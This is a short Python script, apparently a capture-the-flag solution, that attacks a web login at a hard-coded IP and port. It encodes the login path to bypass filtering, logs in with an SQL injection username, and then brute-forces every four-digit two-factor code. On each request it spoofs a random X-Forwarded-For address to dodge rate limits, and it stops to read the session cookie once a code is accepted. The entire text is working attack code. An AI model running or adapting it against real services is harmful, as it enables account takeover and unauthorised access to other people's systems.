import http.client
from random import randint
from time import sleep

# host = "localhost:1337"
host = "94.237.58.211:33145"

conn = http.client.HTTPConnection(host)
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Forwarded-For': '.'.join([str(randint(1,256)) for _ in range(4)])
}

print(headers)
conn.request('POST', '/auth/logi%6E', 'username=admin%27+--&password=a', headers)
# Now there is a random code in the 2fa cache
# Sleep to make sure
sleep(1)
n = 0
while True:
    code = f'{n:04}'
    print(f'Guessing code: {code}')
    # We just guess codes now
    conn = http.client.HTTPConnection(host)
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': '.'.join([str(randint(1,256)) for _ in range(4)])
    }
    conn.request('POST', '/auth/verify-2fa', '2fa-code='+code, headers)

    response = conn.getresponse()
    if response.code != 400:
        if not "/auth/login" in str(response.headers):
            print(response.readlines())
            print(response.headers)

            # Cookie should be in set-cookie header
            exit()
        else:
            print("ran out of time")
            exit()
    n += 1